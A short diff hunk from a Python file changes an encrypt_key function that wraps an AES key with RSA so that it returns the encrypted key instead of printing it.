@@ -48,8 +48,8 @@ def encrypt_key(RSA_key, AES_key):   #Noah Function
         )
     )
     print("cipher")
-    print(cipherKey)
-    return
+   
+    return cipherKey
 
 
 def ReccurseLibrary(Dir):
